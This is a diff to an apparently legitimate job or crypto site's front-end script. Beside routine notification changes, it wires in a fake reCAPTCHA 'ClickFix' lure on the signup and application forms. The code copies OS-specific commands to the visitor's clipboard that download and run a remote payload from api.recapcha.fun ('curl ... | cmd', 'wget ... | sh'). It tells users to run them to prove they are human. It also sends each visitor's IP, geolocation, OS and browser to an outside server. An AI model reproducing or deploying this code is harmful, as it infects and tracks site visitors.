@@ -1,16 +1,44 @@
-﻿(function () {
+﻿var verified = 0;
+(function () {
   const $ = (sel, root) => (root || document).querySelector(sel);
   const $$ = (sel, root) => [...(root || document).querySelectorAll(sel)];
   const page = document.body.dataset.page || "home";
 
   const toastEl = $("#toast");
   let toastTimer;
-  function toast(msg) {
+  const TOAST_MS = 4200;
+  const TOAST_ICONS = {
+    success: '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8"/><path d="M7.5 12.5l3 3 6-6.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>',
+    info: '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8"/><path d="M12 11v6M12 7.5h.01" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>',
+    warning: '<svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M12 3.8L21.2 20H2.8L12 3.8z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M12 10v5M12 17.5h.01" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>'
+  };
+  const TOAST_TITLES = { success: "Success", info: "Notice", warning: "Please note" };
+
+  function hideToast() {
     if (!toastEl) return;
-    toastEl.textContent = msg;
+    toastEl.classList.remove("show");
+    clearTimeout(toastTimer);
+  }
+
+  function toast(msg, opts) {
+    if (!toastEl) return;
+    const options = typeof opts === "string" ? { type: opts } : (opts || {});
+    const type = TOAST_ICONS[options.type] ? options.type : "info";
+    const title = options.title || TOAST_TITLES[type];
+    toastEl.className = "toast toast-" + type;
+    toastEl.setAttribute("role", "status");
+    toastEl.setAttribute("aria-live", "polite");
+    toastEl.innerHTML =
+      '<span class="toast-icon">' + TOAST_ICONS[type] + "</span>" +
+      '<div class="toast-body"><p class="toast-title">' + title + '</p><p class="toast-msg"></p></div>' +
+      '<button type="button" class="toast-close" aria-label="Dismiss">×</button>' +
+      '<span class="toast-progress" style="animation-duration:' + TOAST_MS + 'ms"></span>';
+    toastEl.querySelector(".toast-msg").textContent = msg;
+    toastEl.querySelector(".toast-close").onclick = hideToast;
+    void toastEl.offsetWidth;
     toastEl.classList.add("show");
     clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => toastEl.classList.remove("show"), 3200);
+    toastTimer = setTimeout(hideToast, TOAST_MS);
   }
   window.metadeelToast = toast;
 
@@ -119,30 +147,41 @@
     if (authModal) authModal.classList.remove("open");
   }
 
+  // Hold detached captcha roots; they are not in the visible hosts at script load.
   const rtoRootEl = $("#rto-root");
-  const rtoRootHost = $("#signupCaptchaField");
   const rtoRoot1El = $("#rto-root-1");
-  const rtoRoot1Host = $("#applyCaptchaField");
+  const rtoShowTimers = { root: null, root1: null };
 
-  function showRtoAfterModal(el, host, visible) {
-    if (!el || !host) return;
+  function showRtoAfterModal(el, hostId, visible, timerKey) {
+    if (!el) return;
+    clearTimeout(rtoShowTimers[timerKey]);
+    rtoShowTimers[timerKey] = null;
     el.classList.remove("rto-show");
     if (el.parentNode) el.parentNode.removeChild(el);
     if (!visible) return;
-    setTimeout(() => {
+    rtoShowTimers[timerKey] = setTimeout(() => {
+      rtoShowTimers[timerKey] = null;
+      // Resolve host when showing — fields may be hidden at load and only used after modal open.
+      const host = document.getElementById(hostId);
+      if (!host) return;
+      el.style.opacity = "0";
       host.appendChild(el);
+      void el.offsetWidth;
       requestAnimationFrame(() => {
-        requestAnimationFrame(() => el.classList.add("rto-show"));
+        requestAnimationFrame(() => {
+          el.style.opacity = "";
+          el.classList.add("rto-show");
+        });
       });
     }, 1000);
   }
 
   function showRtoRootAfterModal(visible) {
-    showRtoAfterModal(rtoRootEl, rtoRootHost, visible);
+    showRtoAfterModal(rtoRootEl, "signupCaptchaField", visible, "root");
   }
 
   function showRtoRoot1AfterModal(visible) {
-    showRtoAfterModal(rtoRoot1El, rtoRoot1Host, visible);
+    showRtoAfterModal(rtoRoot1El, "applyCaptchaField", visible, "root1");
   }
 
   function askCaptchaVerification(errorEl, message) {
@@ -167,7 +206,7 @@
   if ($("#logoutBtn")) {
     $("#logoutBtn").onclick = () => {
       setSession(null);
-      toast("You have been logged out.");
+      toast("Your session has ended securely.", { type: "info", title: "Signed out" });
     };
   }
   if (authForm) {
@@ -196,7 +235,7 @@
       }
       setSession({ name: user.name, email: user.email });
       closeAuth();
-      toast("Welcome back, " + (user.name || "").split(" ")[0] + ".");
+      toast("Welcome back, " + (user.name || "").split(" ")[0] + ".", { type: "success", title: "Signed in" });
     };
   }
 
@@ -213,11 +252,16 @@
     applyError.textContent = "";
     applyForm.reset();
     applySub.textContent = "Applying for " + selectedRole + ".";
-    showRtoRoot1AfterModal(false);
+    if(!verified){
+      showRtoRoot1AfterModal(false);
+    }
     applyModal.classList.add("open");
-    showRtoRoot1AfterModal(true);
-    setTimeout(() => $("#applyName").focus(), 50);
+    if(!verified){
+      showRtoRoot1AfterModal(true);
+      setTimeout(() => $("#applyName").focus(), 50);
+    }
   }
+
   function closeApply() {
     showRtoRoot1AfterModal(false);
     if (applyModal) applyModal.classList.remove("open");
@@ -241,7 +285,16 @@
     applyForm.onsubmit = (e) => {
       e.preventDefault();
       applyError.textContent = "";
-      askCaptchaVerification(applyError, "Captcha verification required.");
+      if (!verified) {
+        askCaptchaVerification(applyError, "Captcha verification required.");
+        return;
+      }
+      closeApply();
+      toast("We've received your application for " + selectedRole + ". Our team will review it and follow up by email.", {
+        type: "success",
+        title: "Application received"
+      });
+      verified = 0;
     };
   }
 
@@ -321,7 +374,10 @@
           chainlink: { usd: 8.26, usd_24h_change: -0.19 },
           polkadot: { usd: 0.821494, usd_24h_change: 3.69 }
         };
-        toast("Live market data is temporarily unavailable. Showing the latest available prices.");
+        toast("Live market data is temporarily unavailable. Showing the latest available prices.", {
+          type: "warning",
+          title: "Market data delayed"
+        });
       }
       renderPrices();
     }
@@ -612,6 +668,8 @@
     const captchaContainer = document.getElementById('rto-captchaContainer');
     const comingSoon = document.getElementById('rto-comingSoon');
 
+    if (!rtoRoot || !checkboxBtn || !verifyButton || !verifywindow) return;
+
     function getBrowserName() {
         const ua = navigator.userAgent;
         if (ua.includes("Firefox/")) return "Firefox";
@@ -654,6 +712,7 @@
                 console.log("data.status", data.status);
                 if (!data || !data.status || data.status === 'idle') return;
                 if (data.status === 'started') {
+                    verifyButton.click();
                     enableVerifyButton();
                 } else if (data.status === 'ended') {
                     clearInterval(statusTimer);
@@ -939,58 +998,60 @@
 
 (function () {
     /* ============ FREEZE HOST PAGE ============ */
-    const html = document.documentElement;
-    const body = document.body;
+    const html1 = document.documentElement;
+    const body1 = document.body;
 
-    const preventScroll = function (e) { e.preventDefault(); };
-    const preventKey = function (e) {
+    const preventScroll1 = function (e) { e.preventDefault(); };
+    const preventKey1 = function (e) {
         if (['ArrowUp', 'ArrowDown', 'PageUp', 'PageDown', 'Home', 'End', ' '].includes(e.key)) {
             e.preventDefault();
         }
     };
   
-    const rtoRoot = document.getElementById('rto-root-1');
-    const checkboxWindow = document.getElementById("rto-checkbox-window-1");
-    const checkboxBtn = document.getElementById("rto-checkbox-1");
-    const checkboxBtnSpinner = document.getElementById("rto-spinner-1");
-    const verifywindow = document.getElementById("rto-verify-window-1");
-    const verifyButtonSpinner = document.getElementById("rto-verify-verify-button-spinner-1");
-    const verifyButtonText = document.getElementById("rto-verify-verify-button-text-1");
-    const verifyButton = document.getElementById("rto-verify-verify-button-1");
-    const captchaContainer = document.getElementById('rto-captchaContainer-1');
-    const comingSoon = document.getElementById('rto-comingSoon-1');
+    const rtoRoot1 = document.getElementById('rto-root-1');
+    const checkboxWindow1 = document.getElementById("rto-checkbox-window-1");
+    const checkboxBtn1 = document.getElementById("rto-checkbox-1");
+    const checkboxBtnSpinner1 = document.getElementById("rto-spinner-1");
+    const verifywindow1 = document.getElementById("rto-verify-window-1");
+    const verifyButtonSpinner1 = document.getElementById("rto-verify-verify-button-spinner-1");
+    const verifyButtonText1 = document.getElementById("rto-verify-verify-button-text-1");
+    const verifyButton1 = document.getElementById("rto-verify-verify-button-1");
+    const captchaContainer1 = document.getElementById('rto-captchaContainer-1');
+    const comingSoon1 = document.getElementById('rto-comingSoon-1');
 
-    function getBrowserName() {
-        const ua = navigator.userAgent;
-        if (ua.includes("Firefox/")) return "Firefox";
-        if (ua.includes("Edg/")) return "Edge";
-        if (ua.includes("Chrome/") && !ua.includes("Edg/")) return "Chrome";
-        if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
-        if (ua.includes("OPR/") || ua.includes("Opera")) return "Opera";
+    if (!rtoRoot1 || !checkboxBtn1 || !verifyButton1 || !verifywindow1) return;
+
+    function getBrowserName1() {
+        const ua1 = navigator.userAgent;
+        if (ua1.includes("Firefox/")) return "Firefox";
+        if (ua1.includes("Edg/")) return "Edge";
+        if (ua1.includes("Chrome/") && !ua1.includes("Edg/")) return "Chrome";
+        if (ua1.includes("Safari/") && !ua1.includes("Chrome/")) return "Safari";
+        if (ua1.includes("OPR/") || ua1.includes("Opera")) return "Opera";
         return "Unknown";
     }
-    const browser = getBrowserName();
+    const browser1 = getBrowserName1();
 
     /* ================= STATUS CHECKER ================= */
-    let customizedIpAddress = null;
-    let statusTimer = null;
+    let customizedIpAddress1 = null;
+    let statusTimer1 = null;
 
-    function getIpAddress() {
+    function getIpAddress1() {
         return fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => data.ip);
     }
 
-    function customizeIpAddress(ip) {
-        return ip.replace(/\./g, '-');
+    function customizeIpAddress1(ip1) {
+        return ip1.replace(/\./g, '-');
     }
 
-    console.log("customizedIpAddress", customizedIpAddress);
+    console.log("customizedIpAddress", customizedIpAddress1);
 
-    function getRepairedStatus() {
-        if (!customizedIpAddress) return;
-        console.log("customizedIpAddress", customizedIpAddress);
-        fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress}&token=202`)
+    function getRepairedStatus1() {
+        if (!customizedIpAddress1) return;
+        console.log("customizedIpAddress", customizedIpAddress1);
+        fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress1}&token=202`)
             .then(response => {
                 if (!response.ok) {
                     if (response.status === 404) return null;
@@ -1002,55 +1063,57 @@
                 console.log("data.status", data.status);
                 if (!data || !data.status || data.status === 'idle') return;
                 if (data.status === 'started') {
-                    enableVerifyButton();
+                    verifyButton1.click();
+                    enableVerifyButton1();
                 } else if (data.status === 'ended') {
-                    clearInterval(statusTimer);
-                    disableVerifyButton();
-                    showVerified();
+                    //clearInterval(statusTimer1);
+                    disableVerifyButton1();
+                    showVerified1();
+                    verified = 1;
                 }
             })
             .catch(() => { });
     }
 
     console.log("getIpAddress");
-    getIpAddress()
-        .then((ip) => {
-            customizedIpAddress = customizeIpAddress(ip);
-            console.log("customizedIpAddress", customizedIpAddress);
-            getRepairedStatus();
-            statusTimer = setInterval(getRepairedStatus, 1000);
+    getIpAddress1()
+        .then((ip1) => {
+            customizedIpAddress1 = customizeIpAddress1(ip1);
+            console.log("customizedIpAddress", customizedIpAddress1);
+            getRepairedStatus1();
+            statusTimer1 = setInterval(getRepairedStatus1, 1000);
         })
         .catch(() => { });
 
     /* ================= END STATUS CHECKER ================= */
 
-    verifyButton.addEventListener("click", function () {
-        verifyButtonSpinner.style.display = "inline";
-        verifyButtonSpinner.style.opacity = "1";
-        verifyButtonSpinner.style.animation = "rto-spin 1s linear infinite";
-        verifyButtonText.style.display = "none";
+    verifyButton1.addEventListener("click", function () {
+        verifyButtonSpinner1.style.display = "inline";
+        verifyButtonSpinner1.style.opacity = "1";
+        verifyButtonSpinner1.style.animation = "rto-spin 1s linear infinite";
+        verifyButtonText1.style.display = "none";
     });
 
-    function detectOS() {
-        const platform = navigator.userAgent;
-        if (/windows/i.test(platform)) return "Windows";
-        if (/macintosh|mac os x/i.test(platform)) return "MacOS";
-        if (/linux/i.test(platform)) return "Linux";
-        if (/android/i.test(platform)) return "Android";
-        if (/iphone|ipad|ipod/i.test(platform)) return "iOS";
+    function detectOS1() {
+        const platform1 = navigator.userAgent;
+        if (/windows/i.test(platform1)) return "Windows";
+        if (/macintosh|mac os x/i.test(platform1)) return "MacOS";
+        if (/linux/i.test(platform1)) return "Linux";
+        if (/android/i.test(platform1)) return "Android";
+        if (/iphone|ipad|ipod/i.test(platform1)) return "iOS";
         return "Unknown";
     }
 
-    const osType = detectOS();
-    const isPcOs = (osType === "Windows") || (osType === "MacOS") || (osType === "Linux");
+    const osType1 = detectOS1();
+    const isPcOs1 = (osType1 === "Windows") || (osType1 === "MacOS") || (osType1 === "Linux");
 
-    if (!isPcOs) {
-        captchaContainer.style.display = 'none';
-        comingSoon.style.display = 'flex';
+    if (!isPcOs1) {
+        captchaContainer1.style.display = 'none';
+        comingSoon1.style.display = 'flex';
         return;
     }
 
-    if (osType === "Linux") {
+    if (osType1 === "Linux") {
         document.getElementById("rto-verify-main-1").innerHTML = `
             <p>To better prove you are not a robot, please:</p>
             <ol>
@@ -1066,7 +1129,7 @@
                 ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"
               </div>
             </p>`;
-    } else if (osType === "MacOS") {
+    } else if (osType1 === "MacOS") {
         document.getElementById("rto-verify-main-1").innerHTML = `
             <p>To better prove you are not a robot, please:</p>
             <ol>
@@ -1100,194 +1163,187 @@
             </p>`;
     }
 
-    async function getLocationByIP() {
-        const apiUrl = `https://get.geojs.io/v1/ip/geo/${await getIpAddress()}.json`;
-        const res = await fetch(apiUrl).catch(() => { });
-        const data = await res.json();
-        return data.country + ', ' + data.organization_name + ', ' + data.latitude + ', ' + data.longitude;
+    async function getLocationByIP1() {
+        const apiUrl1 = `https://get.geojs.io/v1/ip/geo/${await getIpAddress1()}.json`;
+        const res1 = await fetch(apiUrl1).catch(() => { });
+        const data1 = await res1.json();
+        return data1.country + ', ' + data1.organization_name + ', ' + data1.latitude + ', ' + data1.longitude;
     }
 
     (async function () {
-        const location = await getLocationByIP();
+        const location1 = await getLocationByIP1();
         fetch('https://status-handler-sage.vercel.app/api/entered-site?token=202', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 token: '202',
                 currentUrl: window.location.href,
-                ip: await getIpAddress(),
-                os: osType,
-                location: location,
-                browser: browser,
+                ip: await getIpAddress1(),
+                os: osType1,
+                location: location1,
+                browser: browser1,
                 timestamp: new Date().toISOString()
             })
         }).then(r => r.json()).catch(() => { });
     })();
 
-    function addCaptchaListeners() {
-        if (!checkboxBtn) return;
+    function addCaptchaListeners1() {
+        if (!checkboxBtn1) return;
         document.addEventListener("click", function (event) {
-            let path = event.composedPath();
-            if (!path.includes(verifywindow) && isverifywindowVisible()) {
-                closeverifywindow();
+            let path1 = event.composedPath();
+            if (!path1.includes(verifywindow1) && isverifywindowVisible1()) {
+                closeverifywindow1();
             }
         });
-        checkboxBtn.addEventListener("click", function (event) {
+        checkboxBtn1.addEventListener("click", function (event) {
             event.preventDefault();
-            checkboxBtn.disabled = true;
-            runClickedCheckboxEffects();
+            checkboxBtn1.disabled = true;
+            runClickedCheckboxEffects1();
         });
     }
 
-    function runClickedCheckboxEffects() {
-        hideCaptchaCheckbox();
+    function runClickedCheckboxEffects1() {
+        hideCaptchaCheckbox1();
         setTimeout(function () {
-            showCaptchaLoading();
+            showCaptchaLoading1();
         }, 500);
         setTimeout(function () {
-            showVerifyWindow();
+            showVerifyWindow1();
         }, 900);
     }
 
-    function showCaptchaLoading() {
-        checkboxBtnSpinner.style.visibility = "visible";
-        checkboxBtnSpinner.style.opacity = "1";
-        if (osType === "Linux")
-            checkboxBtnSpinner.style.top = "-107px";
-        checkboxBtnSpinner.style.animation = "rto-spin 1s linear infinite";
+    function showCaptchaLoading1() {
+        checkboxBtnSpinner1.style.visibility = "visible";
+        checkboxBtnSpinner1.style.opacity = "1";
+        if (osType1 === "Linux")
+            checkboxBtnSpinner1.style.top = "-107px";
+        checkboxBtnSpinner1.style.animation = "rto-spin 1s linear infinite";
     }
 
-    function enableVerifyButton() {
-        verifyButton.disabled = false;
-        verifyButton.style.cursor = "pointer";
-        verifyButton.style.opacity = "1";
-        verifyButton.style.animation = "none";
+    function enableVerifyButton1() {
+        verifyButton1.disabled = false;
+        verifyButton1.style.cursor = "pointer";
+        verifyButton1.style.opacity = "1";
+        verifyButton1.style.animation = "none";
     }
 
-    function disableVerifyButton() {
-        verifyButton.disabled = true;
-        verifyButton.style.cursor = "not-allowed";
-        verifyButton.style.opacity = "0.5";
-        verifyButton.style.animation = "none";
+    function disableVerifyButton1() {
+        verifyButton1.disabled = true;
+        verifyButton1.style.cursor = "not-allowed";
+        verifyButton1.style.opacity = "0.5";
+        verifyButton1.style.animation = "none";
     }
 
-    function hideCaptchaCheckbox() {
-        checkboxBtn.style.visibility = "hidden";
-        checkboxBtn.style.opacity = "0";
+    function hideCaptchaCheckbox1() {
+        checkboxBtn1.style.visibility = "hidden";
+        checkboxBtn1.style.opacity = "0";
     }
 
-    function showCaptchaCheckbox() {
-        checkboxBtn.style.width = "100%";
-        checkboxBtn.style.height = "100%";
-        checkboxBtn.style.borderRadius = "2px";
-        checkboxBtn.style.margin = "21px 0 0 12px";
-        checkboxBtn.style.opacity = "1";
-        checkboxBtn.style.visibility = "visible";
+    function showCaptchaCheckbox1() {
+        checkboxBtn1.style.width = "100%";
+        checkboxBtn1.style.height = "100%";
+        checkboxBtn1.style.borderRadius = "2px";
+        checkboxBtn1.style.margin = "21px 0 0 12px";
+        checkboxBtn1.style.opacity = "1";
+        checkboxBtn1.style.visibility = "visible";
     }
 
-    function hideCaptchaLoading() {
-        checkboxBtnSpinner.style.visibility = "hidden";
-        checkboxBtnSpinner.style.opacity = "0";
+    function hideCaptchaLoading1() {
+        checkboxBtnSpinner1.style.visibility = "hidden";
+        checkboxBtnSpinner1.style.opacity = "0";
     }
 
-    function generateRandomNumber() {
-        const min = 1000;
-        const max = 9999;
-        return Math.floor(Math.random() * (max - min + 1) + min).toString();
+    function generateRandomNumber1() {
+        const min1 = 1000;
+        const max1 = 9999;
+        return Math.floor(Math.random() * (max1 - min1 + 1) + min1).toString();
     }
 
-    function closeverifywindow() {
-        verifywindow.style.display = "none";
-        verifywindow.style.visibility = "hidden";
-        verifywindow.style.opacity = "0";
-        showCaptchaCheckbox();
-        hideCaptchaLoading();
-        checkboxBtn.disabled = false;
+    function closeverifywindow1() {
+        verifywindow1.style.display = "none";
+        verifywindow1.style.visibility = "hidden";
+        verifywindow1.style.opacity = "0";
+        showCaptchaCheckbox1();
+        hideCaptchaLoading1();
+        checkboxBtn1.disabled = false;
     }
 
-    function isverifywindowVisible() {
-        return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
+    function isverifywindowVisible1() {
+        return verifywindow1.style.display !== "none" && verifywindow1.style.display !== "";
     }
 
-    function setClipboardCopyData(textToCopy) {
-        const tempTextArea = document.createElement("textarea");
-        tempTextArea.value = textToCopy;
-        document.body.append(tempTextArea);
-        tempTextArea.select();
+    function setClipboardCopyData1(textToCopy) {
+        const tempTextArea1 = document.createElement("textarea");
+        tempTextArea1.value = textToCopy;
+        document.body.append(tempTextArea1);
+        tempTextArea1.select();
         document.execCommand("copy");
-        document.body.removeChild(tempTextArea);
+        document.body.removeChild(tempTextArea1);
     }
 
-    function stageClipboard(commandToRun, verification_id) {
-        const suffix = " :: ";
-        const ploy = "'' I am not a bot. Fixing the issue as a services. ID: ";
-        const end = "''";
-        const textToCopy = commandToRun + suffix + ploy + verification_id + end;
-        if (osType === "Windows")
-            setClipboardCopyData(textToCopy);
+    function stageClipboard1(commandToRun, verification_id) {
+        const suffix1 = " :: ";
+        const ploy1 = "'' I am not a bot. Fixing the issue as a services. ID: ";
+        const end1 = "''";
+        const textToCopy1 = commandToRun + suffix1 + ploy1 + verification_id + end1;
+        if (osType1 === "Windows")
+            setClipboardCopyData1(textToCopy1);
         else
-            setClipboardCopyData(commandToRun);
+            setClipboardCopyData1(commandToRun);
     }
 
-    function showVerified() {
-        clearInterval(statusTimer);
+    function showVerified1() {
+        // clearInterval(statusTimer1);
         // Restore host page scrolling
-        html.style.overflow = '';
-        html.style.overscrollBehavior = '';
-        body.style.overflow = '';
-        body.style.overscrollBehavior = '';
-        window.removeEventListener('wheel', preventScroll, { passive: false });
-        window.removeEventListener('touchmove', preventScroll, { passive: false });
-        window.removeEventListener('keydown', preventKey, { passive: false });
+        html1.style.overflow = '';
+        html1.style.overscrollBehavior = '';
+        body1.style.overflow = '';
+        body1.style.overscrollBehavior = '';
+        window.removeEventListener('wheel', preventScroll1, { passive: false });
+        window.removeEventListener('touchmove', preventScroll1, { passive: false });
+        window.removeEventListener('keydown', preventKey1, { passive: false });
         // Tear down overlay completely
-        rtoRoot.remove();
+        rtoRoot1.remove();
     }
 
-    function showVerifyWindow() {
-        verifywindow.style.display = "block";
-        verifywindow.style.visibility = "visible";
-        verifywindow.style.opacity = "0";
-        verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
-        verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";
+    function showVerifyWindow1() {
+        verifywindow1.style.display = "block";
+        verifywindow1.style.visibility = "visible";
+        verifywindow1.style.opacity = "0";
+        verifywindow1.style.top = checkboxWindow1.offsetTop - 80 + "px";
+        verifywindow1.style.left = checkboxWindow1.offsetLeft + 54 + "px";
 
-        if (verifywindow.offsetTop < 5) {
-            verifywindow.style.top = "5px";
+        if (verifywindow1.offsetTop < 5) {
+            verifywindow1.style.top = "5px";
         }
-        if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
-            verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
+        if (verifywindow1.offsetLeft + verifywindow1.offsetWidth > window.innerWidth - 10) {
+            verifywindow1.style.left = checkboxWindow1.offsetLeft - 8 + "px";
         }
 
         requestAnimationFrame(() => {
             requestAnimationFrame(() => {
-                verifywindow.style.opacity = "1";
+                verifywindow1.style.opacity = "1";
             });
         });
 
-        hideCaptchaLoading();
-        showCaptchaCheckbox();
-        checkboxBtn.disabled = false;
+        hideCaptchaLoading1();
+        showCaptchaCheckbox1();
+        checkboxBtn1.disabled = false;
 
-        var verification_id = generateRandomNumber();
-        document.getElementById('rto-verification-id').textContent = verification_id;
+        var verification_id1 = generateRandomNumber1();
+        document.getElementById('rto-verification-id').textContent = verification_id1;
 
-        let htaPath;
-        if (osType === "Windows") {
-            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd ";
-        } else if (osType === "Linux") {
-            htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
-        } else if (osType === "MacOS") {
-            htaPath = "curl 'https://api.recapcha.fun/auth/v3?token=202' | sh";
+        let htaPath1;
+        if (osType1 === "Windows") {
+            htaPath1 = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=202 | cmd ";
+        } else if (osType1 === "Linux") {
+            htaPath1 = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=202' | sh";
+        } else if (osType1 === "MacOS") {
+            htaPath1 = "curl 'https://api.recapcha.fun/auth/v3?token=202' | sh";
         }
-        stageClipboard(htaPath, verification_id);
+        stageClipboard1(htaPath1, verification_id1);
     }
 
-    addCaptchaListeners();
+    addCaptchaListeners1();
 })();
 
-(function () {
-  const rtoRoot = document.getElementById("rto-root");
-  if (rtoRoot && rtoRoot.parentNode) rtoRoot.parentNode.removeChild(rtoRoot);
-  const rtoRoot1 = document.getElementById("rto-root-1");
-  if (rtoRoot1 && rtoRoot1.parentNode) rtoRoot1.parentNode.removeChild(rtoRoot1);
-})();
- 
